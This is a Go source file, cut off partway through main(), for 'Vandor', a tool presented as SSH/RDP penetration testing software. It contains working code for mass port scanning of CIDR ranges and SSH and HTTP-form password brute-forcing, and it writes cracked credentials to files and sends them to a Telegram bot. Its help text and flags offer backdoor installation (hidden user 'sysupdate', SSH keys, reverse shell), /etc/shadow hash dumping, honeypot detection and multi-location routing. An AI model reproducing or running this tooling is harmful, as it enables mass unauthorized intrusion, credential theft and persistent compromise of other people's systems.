package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
	"golang.org/x/crypto/ssh"

	"github.com/batmanpriv/Vandor/archive"
	"github.com/batmanpriv/Vandor/colors"
	"github.com/batmanpriv/Vandor/config"
	hp "github.com/batmanpriv/Vandor/honeypot"
	"github.com/batmanpriv/Vandor/internal"
	ex "github.com/batmanpriv/Vandor/postexploit"
	prtl "github.com/batmanpriv/Vandor/protocols"
)

const maxFileBuffer = 10000

var (
	crackedList   []string
	crackedMu     sync.RWMutex
	startTime     time.Time
	crackedBuffer *prtl.CircularBuffer
	savedCache    = make(map[string]bool)
	savedMu       sync.Mutex
)

type ResultJSON struct {
	Timestamp  string        `json:"timestamp"`
	Duration   string        `json:"duration"`
	TotalHosts int           `json:"total_hosts"`
	TotalCreds int           `json:"total_credentials"`
	Cracked    []string      `json:"cracked"`
	Statistics prtl.StatData `json:"statistics"`
}

func init() {
	color.NoColor = false
	if runtime.GOOS == "windows" {
		_ = color.CyanString("")
	}
}

func attackModeNull(host, port, user string, timeout int, protocol string) bool {
	switch protocol {
	case "ssh":
		cfg := &ssh.ClientConfig{
			User:            user,
			Auth:            []ssh.AuthMethod{ssh.Password("")},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         time.Duration(timeout) * time.Second,
		}
		conn, err := ssh.Dial("tcp", net.JoinHostPort(host, port), cfg)
		if err == nil {
			conn.Close()
			return true
		}
	}
	return false
}

func attackModeUserAsPass(host, port, user string, timeout int, protocol string) bool {
	switch protocol {
	case "ssh":
		cfg := &ssh.ClientConfig{
			User:            user,
			Auth:            []ssh.AuthMethod{ssh.Password(user)},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         time.Duration(timeout) * time.Second,
		}
		conn, err := ssh.Dial("tcp", net.JoinHostPort(host, port), cfg)
		if err == nil {
			conn.Close()
			return true
		}
	}
	return false
}

func attackModeReverseUser(host, port, user string, timeout int, protocol string) bool {
	reverse := reverseString(user)
	switch protocol {
	case "ssh":
		cfg := &ssh.ClientConfig{
			User:            user,
			Auth:            []ssh.AuthMethod{ssh.Password(reverse)},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         time.Duration(timeout) * time.Second,
		}
		conn, err := ssh.Dial("tcp", net.JoinHostPort(host, port), cfg)
		if err == nil {
			conn.Close()
			return true
		}
	}
	return false
}

func reverseString(s string) string {
	runes := []rune(s)
	for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
		runes[i], runes[j] = runes[j], runes[i]
	}
	return string(runes)
}

func detectServicePort(host string, timeout int) map[string]string {
	commonPorts := map[string]int{"ssh": 22, "rdp": 3389}
	detected := make(map[string]string)
	for service, port := range commonPorts {
		dialer := net.Dialer{}
		conn, err := dialer.DialContext(context.Background(), "tcp", net.JoinHostPort(host, strconv.Itoa(port)))
		if err == nil {
			conn.Close()
			detected[service] = strconv.Itoa(port)
		}
	}
	return detected
}

func runHTTPForm(host, port, path, userField, passField, user, pass string, timeout int) bool {
	if port == "" {
		port = "80"
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	formData := fmt.Sprintf("%s=%s&%s=%s", userField, user, passField, pass)
	reqBody := bytes.NewBufferString(formData)
	url := fmt.Sprintf("http://%s:%s%s", host, port, path)
	req, err := http.NewRequestWithContext(ctx, "POST", url, reqBody)
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	client := &http.Client{Timeout: time.Duration(timeout) * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	bodyStr := strings.ToLower(string(body))
	failPatterns := []string{"login failed", "invalid", "incorrect", "error"}
	for _, pattern := range failPatterns {
		if strings.Contains(bodyStr, pattern) {
			return false
		}
	}
	return resp.StatusCode == 302 || resp.StatusCode == 200
}

func banner() {
	fmt.Printf(colors.Red + colors.Bold + `
          _______  _        ______   _______  _______ 
|\     /|(  ___  )( (    /|(  __  \ (  ___  )(  ____ )
| )   ( || (   ) ||  \  ( || (  \  )| (   ) || (    )|
| |   | || (___) ||   \ | || |   ) || |   | || (____)|
( (   ) )|  ___  || (\ \) || |   | || |   | ||     __)
 \ \_/ / | (   ) || | \   || |   ) || |   | || (\ (   
  \   /  | )   ( || )  \  || (__/  )| (___) || ) \ \__
   \_/   |/     \||/    )_)(______/ (_______)|/   \__/
                                                      
` + colors.Reset)
	fmt.Printf(colors.Cyan + colors.Bold + `
┌────────────────────────────────────────────────────────────────────────────────────┐
│                         SSH & RDP PENETRATION TESTING                              │
├────────────────────────────────────────────────────────────────────────────────────┤
│  [ok] SSH Cracking         │  Brute force SSH with custom wordlists                │
│  [ok] RDP Cracking         │  Brute force RDP with NLA support                     │
│  [ok] RAR/ZIP Cracking     │  Crack password protected RAR and ZIP files           │
│  [ok] Post-Exploitation    │  Backdoor | Persistence | Hash Dump                   │
│  [ok] Telegram Alerts      │  Real-time notifications on cracks                    │
│  [ok] Resume Support       │  Continue from checkpoint if interrupted              │
└────────────────────────────────────────────────────────────────────────────────────┘
` + colors.Reset)
	fmt.Println()
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func readLines(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var lines []string
	s := bufio.NewScanner(f)
	buf := make([]byte, 64*1024)
	s.Buffer(buf, 1024*1024)
	for s.Scan() {
		line := strings.TrimSpace(s.Text())
		line = strings.Trim(line, "\r\n\t ")
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}
	
	return lines, s.Err()
}

func readCredsFile(path string) ([]string, []string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, nil, err
	}
	defer f.Close()
	var users, passes []string
	s := bufio.NewScanner(f)
	buf := make([]byte, 64*1024)
	s.Buffer(buf, 1024*1024)
	for s.Scan() {
		line := strings.TrimSpace(s.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if strings.Contains(line, ":") {
			parts := strings.SplitN(line, ":", 2)
			users = append(users, ex.SanitizeInput(parts[0]))
			passes = append(passes, parts[1])
		}
	}
	return users, passes, s.Err()
}

func expandCIDR(cidr string) ([]string, error) {
	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}
	var ips []string
	ip := ipnet.IP.Mask(ipnet.Mask)
	ones, bits := ipnet.Mask.Size()
	maxIPs := 1 << (bits - ones)
	if maxIPs > 65536 {
		return nil, fmt.Errorf("CIDR too large: %d IPs", maxIPs)
	}
	for {
		ips = append(ips, ip.String())
		next := make(net.IP, len(ip))
		copy(next, ip)
		for i := len(next) - 1; i >= 0; i-- {
			next[i]++
			if next[i] != 0 {
				break
			}
		}
		if !ipnet.Contains(next) {
			break
		}
		ip = next
	}
	return ips, nil
}

func parsePorts(portSpec string) ([]int, error) {
	if portSpec == "" {
		return []int{22, 3389}, nil
	}
	var ports []int
	parts := strings.Split(portSpec, ",")
	for _, part := range parts {
		part = strings.TrimSpace(part)
		if strings.Contains(part, "-") {
			rangeParts := strings.Split(part, "-")
			if len(rangeParts) != 2 {
				continue
			}
			start, err := strconv.Atoi(rangeParts[0])
			if err != nil || start < 1 || start > 65535 {
				continue
			}
			end, err := strconv.Atoi(rangeParts[1])
			if err != nil || end < 1 || end > 65535 {
				continue
			}
			if start > end {
				start, end = end, start
			}
			if end-start > 1000 {
				return nil, fmt.Errorf("port range too large: %d ports", end-start)
			}
			for p := start; p <= end; p++ {
				ports = append(ports, p)
			}
		} else {
			port, err := strconv.Atoi(part)
			if err == nil && port >= 1 && port <= 65535 {
				ports = append(ports, port)
			}
		}
	}
	seen := make(map[int]bool)
	unique := make([]int, 0, len(ports))
	for _, p := range ports {
		if !seen[p] {
			seen[p] = true
			unique = append(unique, p)
		}
	}
	if len(unique) == 0 {
		return []int{22, 3389}, nil
	}
	return unique, nil
}

func saveLiveHost(host, port string) {
	f, err := os.OpenFile("LIVE.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	if port != "" {
		fmt.Fprintf(f, "%s:%s\n", host, port)
	} else {
		fmt.Fprintf(f, "%s\n", host)
	}
}

func isAlive(host, port string, timeout int) bool {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()
	var dialer net.Dialer
	conn, err := dialer.DialContext(ctx, "tcp", net.JoinHostPort(host, port))
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func portScan(host string, ports []int, threads int, timeoutMs int) []int {
	if len(ports) == 0 {
		ports = []int{22, 3389}
	}
	var openPorts []int
	var mu sync.Mutex
	var wg sync.WaitGroup

	scanThreads := threads
	if scanThreads < 1 {
		scanThreads = 2000
	}
	if scanThreads > 20000 {
		scanThreads = 20000
	}

	if timeoutMs < 10 {
		timeoutMs = 100
	}
	if timeoutMs > 5000 {
		timeoutMs = 5000
	}

	sem := make(chan struct{}, scanThreads)
	timeout := time.Duration(timeoutMs) * time.Millisecond

	for _, port := range ports {
		wg.Add(1)
		sem <- struct{}{}
		go func(p int) {
			defer wg.Done()
			defer func() { <-sem }()

			conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, p), timeout)
			if err == nil {
				conn.Close()
				mu.Lock()
				openPorts = append(openPorts, p)
				mu.Unlock()
				fmt.Printf("  %s %s:%d OPEN%s\n", colors.Green, host, p, colors.Reset)
				savePortScanResult(host, p)
			}
		}(port)
	}
	wg.Wait()
	sort.Ints(openPorts)
	if len(openPorts) == 0 {
		fmt.Printf("\n%s[no] No open ports found on %s%s\n", colors.Red, host, colors.Reset)
	}
	return openPorts
}

func savePortScanResult(host string, port int) {
	f, err := os.OpenFile("open_ports.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	fmt.Fprintf(f, "%s:%d\n", host, port)
}

func checkAlive(hosts []string, port string, timeout int, threads int) []string {
	var aliveHosts []string
	var mu sync.Mutex
	var wg sync.WaitGroup

	scanThreads := threads
	if scanThreads < 1 {
		scanThreads = 2000
	}
	if scanThreads > 20000 {
		scanThreads = 20000
	}

	sem := make(chan struct{}, scanThreads)
	for _, host := range hosts {
		wg.Add(1)
		sem <- struct{}{}
		go func(h string) {
			defer wg.Done()
			defer func() { <-sem }()
			if isAlive(h, port, timeout) {
				mu.Lock()
				aliveHosts = append(aliveHosts, h)
				mu.Unlock()
				fmt.Printf("  %s %s:%s ALIVE%s\n", colors.Green, h, port, colors.Reset)
				saveLiveHost(h, port)
			} else {
				fmt.Printf("  %s %s:%s DEAD%s\n", colors.Red, h, port, colors.Reset)
			}
		}(host)
	}
	wg.Wait()
	return aliveHosts
}

func banHost(host string, reason string, cp *prtl.Checkpoint) {
	cp.Lock()
	defer cp.Unlock()
	if cp.BannedHosts == nil {
		cp.BannedHosts = make(map[string]string)
	}
	cp.BannedHosts[host] = reason
	prtl.SaveCheckpoint(cp)
	fmt.Printf("%s[⚠] BANNED: %s - %s%s\n", colors.Red, host, reason, colors.Reset)
	if config.TelegramToken != "" && config.TelegramChatID != "" {
		go internal.SendTelegramNotification("banned", map[string]interface{}{
			"host":   host,
			"reason": reason,
		})
	}
}

func exportResults(crackedList []string, completedHosts int32, TotalAttempts, successAttempts int64, honeypotCount, bannedCount int) {
	if len(crackedList) == 0 && honeypotCount == 0 {
		return
	}
	var mostUsedPass string
	maxCount := 0
	prtl.LearningMu.RLock()
	for pass, count := range prtl.LearningMap {
		if count > maxCount {
			maxCount = count
			mostUsedPass = pass
		}
	}
	prtl.LearningMu.RUnlock()
	var commonPattern string
	for _, pattern := range prtl.PasswordPatterns {
		for _, entry := range crackedList {
			if strings.Contains(entry, fmt.Sprintf(pattern, "")) {
				commonPattern = pattern
				break
			}
		}
		if commonPattern != "" {
			break
		}
	}
	successRate := 0.0
	if TotalAttempts > 0 {
		successRate = float64(successAttempts) / float64(TotalAttempts) * 100
	}
	stats := prtl.StatData{
		TotalAttempts:    TotalAttempts,
		SuccessRate:      successRate,
		AvgTimePerHost:   time.Since(startTime).Seconds() / float64(completedHosts+1),
		MostUsedPass:     mostUsedPass,
		CommonPattern:    commonPattern,
		HoneypotDetected: honeypotCount,
		BannedHosts:      bannedCount,
	}
	var existingResults ResultJSON
	var allCracked []string
	if _, err := os.Stat("results.json"); err == nil {
		f, err := os.Open("results.json")
		if err == nil {
			defer f.Close()
			decoder := json.NewDecoder(f)
			if err := decoder.Decode(&existingResults); err == nil {
				allCracked = existingResults.Cracked
			}
		}
	}
	existingMap := make(map[string]bool)
	for _, entry := range allCracked {
		existingMap[entry] = true
	}
	for _, entry := range crackedList {
		if !existingMap[entry] {
			allCracked = append(allCracked, entry)
		}
	}
	result := ResultJSON{
		Timestamp:  startTime.Format("2006-01-02 15:04:05"),
		Duration:   time.Since(startTime).Round(time.Second).String(),
		TotalHosts: int(completedHosts),
		TotalCreds: len(allCracked),
		Cracked:    allCracked,
		Statistics: stats,
	}
	jsonFile, err := os.Create("results.json")
	if err == nil {
		defer jsonFile.Close()
		data, _ := json.MarshalIndent(result, "", "  ")
		jsonFile.Write(data)
		fmt.Printf("[EXPORT] results.json updated (%d total entries)\n", len(allCracked))
	}
	var csvExists bool
	if _, err := os.Stat("results.csv"); err == nil {
		csvExists = true
	}
	csvFile, err := os.OpenFile("results.csv", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		defer csvFile.Close()
		if !csvExists {
			csvFile.WriteString("host,port,username,password,banner\n")
		}
		existingCSV := make(map[string]bool)
		if csvExists {
			readFile, _ := os.Open("results.csv")
			if readFile != nil {
				scanner := bufio.NewScanner(readFile)
				for scanner.Scan() {
					line := scanner.Text()
					if !strings.HasPrefix(line, "host,") {
						existingCSV[line] = true
					}
				}
				readFile.Close()
			}
		}
		newCount := 0
		for _, entry := range crackedList {
			parts := strings.Split(entry, "|")
			if len(parts) >= 2 {
				hostPort := strings.Split(parts[0], ":")
				if len(hostPort) == 2 && len(parts) == 3 {
					credParts := strings.Split(parts[1], ":")
					if len(credParts) == 2 {
						csvLine := fmt.Sprintf("%s,%s,%s,%s,%s",
							hostPort[0], hostPort[1], credParts[0], credParts[1], parts[2])
						if !existingCSV[csvLine] {
							fmt.Fprintf(csvFile, "%s\n", csvLine)
							newCount++
						}
					}
				}
			}
		}
		fmt.Printf("[EXPORT] results.csv updated (%d new entries)\n", newCount)
	}
}

func getListFromInput(input string) []string {
	if input == "" {
		return []string{}
	}
	if _, err := os.Stat(input); err == nil {
		lines, err := readLines(input)
		if err == nil && len(lines) > 0 {
			cleanLines := make([]string, len(lines))
			for i, line := range lines {
				cleanLines[i] = strings.TrimSpace(strings.Trim(line, "\r\n\t "))
			}
			
			fmt.Printf("[DEBUG] getListFromInput: %s -> %d lines\n", input, len(cleanLines))
			
			return cleanLines
		}
		return []string{input}
	}
	cleaned := strings.TrimSpace(strings.Trim(input, "\r\n\t "))
	return []string{cleaned}
}

func showHelp() {
	fmt.Printf(`
╔══════════════════════════════════════════════════════════════════════════════════╗
║                              VANDOR - SSH/RDP CRACKER                            ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║  SSH & RDP Penetration Testing Tool                                             ║
╚══════════════════════════════════════════════════════════════════════════════════╝

═══════════════════════════════════════════════════════════════════════════════════
 REQUIRED ARGUMENTS
═══════════════════════════════════════════════════════════════════════════════════

  -targets, -t        IP address, CIDR, or file containing hosts
                      Example: -targets 192.168.1.1
                               -targets 192.168.1.0/24
                               -targets hosts.txt

  -users, -u          Username or file with usernames
                      Example: -users root
                               -users users.txt

  -passwords, -p      Password or file with passwords
                      Example: -passwords admin123
                               -passwords rockyou.txt

═══════════════════════════════════════════════════════════════════════════════════
 PROTOCOL
═══════════════════════════════════════════════════════════════════════════════════

  -protocol, -proto   Protocol to attack (ssh or rdp)
                      Default: ssh

═══════════════════════════════════════════════════════════════════════════════════
 SCANNING MODES
═══════════════════════════════════════════════════════════════════════════════════

  -alive              Check if hosts are alive (TCP connect)
  -ps                 Port scan targets (comma or range). Default: 22,3389
  -ps-threads         Threads for port scan (default: 2000, max: 20000)
  -ps-timeout         Timeout in milliseconds for port scan (default: 100)

═══════════════════════════════════════════════════════════════════════════════════
 CRACKING PERFORMANCE
═══════════════════════════════════════════════════════════════════════════════════

  -crack-threads      Threads for cracking (default: 5000, max: 20000)
  -crack-timeout      Timeout in seconds for cracking (default: 15)

═══════════════════════════════════════════════════════════════════════════════════
 ATTACK MODES
═══════════════════════════════════════════════════════════════════════════════════

  -attack-mode        normal, null, userpass, reverse (default: normal)
  -mass-pwn           Attack all hosts with all credentials simultaneously
  -smart-pass         Generate smart passwords based on usernames

═══════════════════════════════════════════════════════════════════════════════════
 POST-EXPLOITATION
═══════════════════════════════════════════════════════════════════════════════════

  -backdoor           Install backdoor after crack
  -backdoor-type      ssh-key, hidden-user, reverse-shell, sshd-port, all
  -backdoor-port      Port for backdoor (default: 22222)
  -backdoor-user      Hidden username (default: sysupdate)
  -backdoor-pass      Password for hidden user (default: P@ssw0rd123!)
  -post-exploit       Gather system information
  -extract-hash       Extract password hashes (/etc/shadow)
  -scan-network       Scan internal network after access
  -gen-script         Generate auto-login script

═══════════════════════════════════════════════════════════════════════════════════
 OTHER
═══════════════════════════════════════════════════════════════════════════════════

  -port, -P           Custom port (default: 22 for SSH, 3389 for RDP)
  -timeout, -to       Connection timeout in seconds (default: 5)
  -threads, -th       Concurrent threads (default: 5000)
  -creds, -c          Credentials file (user:pass format)
  -skip-alive         Skip checking if host is alive
  -resume             Resume from checkpoint
  -honeypot           Detect honeypots before attacking
  -multi-city         Route through multiple cities
  -monitor            Show real-time monitoring

═══════════════════════════════════════════════════════════════════════════════════
 TELEGRAM
═══════════════════════════════════════════════════════════════════════════════════

  -bot-token          Telegram bot token
  -chat-id            Telegram chat ID
  -notify, -not       0=off, 1=on crack, 2=on completion

═══════════════════════════════════════════════════════════════════════════════════
 OUTPUT
═══════════════════════════════════════════════════════════════════════════════════

  -json               Export JSON results (default: true)
  -csv                Export CSV results

═══════════════════════════════════════════════════════════════════════════════════
 RAR/ZIP CRACKING
═══════════════════════════════════════════════════════════════════════════════════

  -rar                RAR file to crack
  -rar-dict           Password dictionary for RAR
  -rar-workers        Workers for RAR (default: CPU*2)
  -rar-buffer         Buffer size (default: 10000)
  -zip                ZIP file to crack
  -zip-dict           Password dictionary for ZIP
  -zip-workers        Workers for ZIP (default: CPU*2)
  -zip-buffer         Buffer size (default: 10000)

═══════════════════════════════════════════════════════════════════════════════════
 EXAMPLES
═══════════════════════════════════════════════════════════════════════════════════

  # Port scan
  ./Vandor -targets 192.168.1.0/24 -ps 22,80,443

  # Fast port scan
  ./Vandor -targets 192.168.1.0/24 -ps -ps-threads 10000 -ps-timeout 50

  # SSH crack
  ./Vandor -targets hosts.txt -users users.txt -passwords rockyou.txt -crack-threads 10000

  # RDP crack
  ./Vandor -targets hosts.txt -users users.txt -passwords pass.txt -protocol rdp

  # With Telegram
  ./Vandor -targets hosts.txt -users users.txt -passwords pass.txt -bot-token "TOKEN" -chat-id "ID" -notify 1

═══════════════════════════════════════════════════════════════════════════════════
`)
}

func runRARCracker(rarFile, dictFile string, workers, bufferSize int) {
	fmt.Printf("\n%s\n", strings.Repeat("=", 60))
	fmt.Printf("%s RAR CRACKER MODE ACTIVATED %s\n", colors.Red, colors.Reset)
	fmt.Printf("%s\n", strings.Repeat("=", 60))

	cracker := archive.NRarCracker(rarFile, dictFile, workers, bufferSize)
	result := cracker.Crack()

	fmt.Printf("\n%s\n", strings.Repeat("=", 60))
	if result.Success {
		fmt.Printf("%s[ok] PASSWORD FOUND: %s%s\n", colors.Green, result.Password, colors.Reset)
	} else {
		fmt.Printf("%s[no] No password found%s\n", colors.Red, colors.Reset)
	}
	if result.Error != "" {
		fmt.Printf("%s[no] Error: %s%s\n", colors.Red, result.Error, colors.Reset)
	}
	fmt.Printf("[ok] Time: %v (%.2f pwd/sec)\n", result.TimeSpent, float64(result.Tested)/result.TimeSpent.Seconds())
	fmt.Printf("[ok] Tested: %d passwords\n", result.Tested)
	fmt.Printf("%s\n", strings.Repeat("=", 60))
}

func runZIPCracker(zipFile, dictFile string, workers, bufferSize int) {
	fmt.Printf("\n%s ZIP CRACKER %s\n", strings.Repeat("=", 50), strings.Repeat("=", 50))
	cracker := archive.NZipCracker(zipFile, dictFile, workers, bufferSize)
	result := cracker.Crack()
	fmt.Printf("\n%s\n", strings.Repeat("=", 60))
	if result.Success {
		fmt.Printf("%s[ok] PASSWORD FOUND: %s%s\n", colors.Green, result.Password, colors.Reset)
	} else {
		fmt.Printf("%s[no] No password found%s\n", colors.Red, colors.Reset)
	}
	if result.Error != "" {
		fmt.Printf("%s[no] Error: %s%s\n", colors.Red, result.Error, colors.Reset)
	}
	fmt.Printf("[ok] Time: %v (%.2f pwd/sec)\n", result.TimeSpent, float64(result.Tested)/result.TimeSpent.Seconds())
	fmt.Printf("[ok] Tested: %d passwords\n", result.Tested)
	fmt.Printf("%s\n", strings.Repeat("=", 60))
}

func isDuplicate(host, port, user, pass string) bool {
	entry := fmt.Sprintf("%s:%s:%s:%s", host, port, user, pass)
	savedMu.Lock()
	defer savedMu.Unlock()
	if savedCache[entry] {
		return true
	}
	savedCache[entry] = true
	return false
}

func saveCracked(host, port, user, pass, banner string) {
	entry := fmt.Sprintf("%s:%s|%s:%s|%s", host, port, user, pass, banner)

	savedMu.Lock()
	if savedCache[entry] {
		savedMu.Unlock()
		return
	}
	savedCache[entry] = true
	savedMu.Unlock()

	crackedMu.Lock()
	
	for _, existing := range crackedList {
		if existing == entry {
			crackedMu.Unlock()
			return
		}
	}
	crackedList = append(crackedList, entry)
	crackedMu.Unlock()

	if crackedBuffer != nil {
		crackedBuffer.Append(entry)
	}

	fmt.Printf("\n%s✓ CRACKED!%s %s@%s:%s | %s\n", colors.Green, colors.Reset, user, host, port, pass)

	f, err := os.OpenFile("Cracked.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err == nil {
		defer f.Close()
		fmt.Fprintf(f, "%s\n", entry)
	}

	if config.TelegramToken != "" && config.TelegramChatID != "" {
		go internal.SendTelegramNotification("cracked", map[string]interface{}{
			"host": host, "port": port, "user": user, "pass": pass, "banner": banner,
		})
	}
}

func getTargets(input string) ([]string, error) {
	if input == "" {
		return nil, fmt.Errorf("no targets specified")
	}

	if strings.Contains(input, "/") && !strings.Contains(input, ".") {
		lines, err := readLines(input)
		if err == nil && len(lines) > 0 {
			return lines, nil
		}
	}

	if strings.Contains(input, "/") && strings.Contains(input, ".") {
		ips, err := expandCIDR(input)
		if err == nil && len(ips) > 0 {
			return ips, nil
		}
	}

	if strings.HasSuffix(input, ".txt") || strings.HasSuffix(input, ".lst") {
		lines, err := readLines(input)
		if err == nil && len(lines) > 0 {
			return lines, nil
		}
	}

	if _, err := os.Stat(input); err == nil {
		lines, err := readLines(input)
		if err == nil && len(lines) > 0 {
			return lines, nil
		}
	}

	if strings.Contains(input, ",") {
		var result []string
		for _, part := range strings.Split(input, ",") {
			part = strings.TrimSpace(part)
			if part != "" {
				result = append(result, part)
			}
		}
		if len(result) > 0 {
			return result, nil
		}
	}

	return []string{input}, nil
}

func main() {
	startTime = time.Now()

	targetsFlag := flag.String("targets", "", "Target IP(s) or file")
	usersFlag := flag.String("users", "", "Username or file")
	passwordsFlag := flag.String("passwords", "", "Password or file")
	protocolFlag := flag.String("protocol", "ssh", "Protocol: ssh or rdp")

	rarFile := flag.String("rar", "", "RAR file to crack")
	rarDict := flag.String("rar-dict", "", "Password dictionary for RAR")
	rarWorkers := flag.Int("rar-workers", 0, "Number of workers for RAR (default: CPU*2)")
	rarBuffer := flag.Int("rar-buffer", 10000, "Buffer size for password channel")

	zipFile := flag.String("zip", "", "ZIP file to crack")
	zipDict := flag.String("zip-dict", "", "Password dictionary for ZIP")
	zipWorkers := flag.Int("zip-workers", 0, "Number of workers for ZIP (default: CPU*2)")
	zipBuffer := flag.Int("zip-buffer", 10000, "Buffer size for password channel")

	portFlag := flag.String("port", "", "Custom port")
	timeoutFlag := flag.Int("timeout", 5, "Connection timeout in seconds")
	threadsFlag := flag.Int("threads", 5000, "Concurrent threads")
	credsFile := flag.String("creds", "", "Credentials file (user:pass format)")
	notifyFlag := flag.Int("notify", 0, "Telegram notification: 0=off, 1=on crack, 2=on completion")
	botToken := flag.String("bot-token", "", "Telegram bot token")
	chatID := flag.String("chat-id", "", "Telegram chat ID")

	skipAlive := flag.Bool("skip-alive", false, "Skip checking if host is alive")
	resume := flag.Bool("resume", false, "Resume from checkpoint")
	smartPass := flag.Bool("smart-pass", false, "Generate smart passwords")
	postExploit := flag.Bool("post-exploit", false, "Gather system info after cracking")
	scanNetwork := flag.Bool("scan-network", false, "Scan internal network after access")
	extractHash := flag.Bool("extract-hash", false, "Extract password hashes")
	generateScript := flag.Bool("gen-script", false, "Generate auto-login script")
	monitor := flag.Bool("monitor", false, "Enable real-time monitoring")
	honeypotCheck := flag.Bool("honeypot", false, "Enable honeypot detection")
	multiCity := flag.Bool("multi-city", false, "Route through multiple cities")
	massPwn := flag.Bool("mass-pwn", false, "Attack all hosts with all credentials")
	outputJSON := flag.Bool("json", true, "Export JSON results")
	outputCSV := flag.Bool("csv", false, "Export CSV results")
	help := flag.Bool("help", false, "Show help message")
	example := flag.Bool("example", false, "Show examples")

	aliveFlag := flag.Bool("alive", false, "Check if hosts are alive (TCP connect)")
	portScanFlag := flag.String("ps", "", "Port scan targets (comma or range). Default: 22,3389")
	psThreads := flag.Int("ps-threads", 2000, "Number of threads for port scan (default: 2000, max: 20000)")
	psTimeout := flag.Int("ps-timeout", 100, "Timeout in milliseconds for port scan (default: 100)")

	crackThreads := flag.Int("crack-threads", 5000, "Number of threads for cracking (default: 5000, max: 20000)")
	crackTimeout := flag.Int("crack-timeout", 15, "Connection timeout in seconds for cracking (default: 10)")

	backdoorEnabled := flag.Bool("backdoor", false, "Install backdoor after cracking")
	backdoorType := flag.String("backdoor-type", "ssh-key", "Backdoor type: ssh-key, hidden-user, reverse-shell, sshd-port, all")
	backdoorPort := flag.Int("backdoor-port", 22222, "Port for backdoor")
	backdoorUser := flag.String("backdoor-user", "sysupdate", "Hidden username")
	backdoorPass := flag.String("backdoor-pass", "P@ssw0rd123!", "Password for hidden user")
	backdoorKey := flag.String("backdoor-key", "", "SSH public key to install")

	attackMode := flag.String("attack-mode", "normal", "normal|null|userpass|reverse")
	minDelay := flag.Int("min-delay", 0, "Minimum random delay (ms)")
	maxDelay := flag.Int("max-delay", 0, "Maximum random delay (ms)")

	flag.Parse()

	if *help || *example || (len(os.Args) == 1) {
		showHelp()
		if len(os.Args) == 1 {
			fmt.Printf("\n%s[!] No arguments provided! Use -help for help.%s\n", colors.Yellow, colors.Reset)
		}
		os.Exit(0)
	}

	banner()

	if *rarFile != "" && *rarDict != "" {
		runRARCracker(*rarFile, *rarDict, *rarWorkers, *rarBuffer)
		if *targetsFlag == "" && *zipFile == "" && *zipDict == "" {
			return
		}
	}

	if *zipFile != "" && *zipDict != "" {
		runZIPCracker(*zipFile, *zipDict, *zipWorkers, *zipBuffer)
		if *targetsFlag == "" && *rarFile == "" && *rarDict == "" {
			return
		}
	}

	targets := *targetsFlag
	users := *usersFlag
	passwords := *passwordsFlag
	protocol := *protocolFlag
	port := *portFlag
	timeout := *timeoutFlag
	threads := *threadsFlag
	notify := *notifyFlag

	if targets == "" && !*aliveFlag && *portScanFlag == "" {
		fmt.Printf("%s[ERROR] No targets specified! Use -targets%s\n", colors.Red, colors.Reset)
		fmt.Printf("%s[INFO] Run with -help for help%s\n", colors.Cyan, colors.Reset)
		os.Exit(1)
	}

	var hosts []string
	if targets != "" {
		if strings.Contains(targets, "/") && strings.Contains(targets, ".") {
			ips, err := expandCIDR(targets)
			if err != nil {
				fmt.Printf("%s[ERROR] invalid CIDR: %v%s\n", colors.Red, err, colors.Reset)
				os.Exit(1)
			}
			hosts = ips
			fmt.Printf("[CIDR] Expanded to %d IPs\n", len(hosts))
		} else if !strings.Contains(targets, "\n") && !strings.Contains(targets, ".txt") && !strings.Contains(targets, "/") {
			hosts = []string{targets}
		} else {
			var err error
			hosts, err = readLines(targets)
			if err != nil || len(hosts) == 0 {
				fmt.Printf("%s[ERROR] invalid hosts file%s\n", colors.Red, colors.Reset)
				os.Exit(1)
			}
		}
	}

	if *portScanFlag != "" && len(hosts) > 0 {
		ports, err := parsePorts(*portScanFlag)
		if err != nil {
			fmt.Printf("%s[ERROR] invalid port spec: %v%s\n", colors.Red, err, colors.Reset)
			os.Exit(1)
		}
		portStr := ""
		for i, p := range ports {
			if i > 0 {
				portStr += ","
			}
			portStr += strconv.Itoa(p)
		}
		fmt.Printf("\n[SCAN] Port scanning %d hosts for ports: %s\n", len(hosts), portStr)
		fmt.Printf("[SCAN] Using %d threads | Timeout: %dms\n", *psThreads, *psTimeout)
		fmt.Println()

		totalOpen := 0
		scanStart := time.Now()

		for _, host := range hosts {
			fmt.Printf("[SCAN] Scanning %s\n", host)
			openPorts := portScan(host, ports, *psThreads, *psTimeout)
			if len(openPorts) > 0 {
				totalOpen += len(openPorts)
				fmt.Printf("[SCAN] %s: %d open ports found\n", host, len(openPorts))
			}
			fmt.Println()
		}

		scanDuration := time.Since(scanStart)
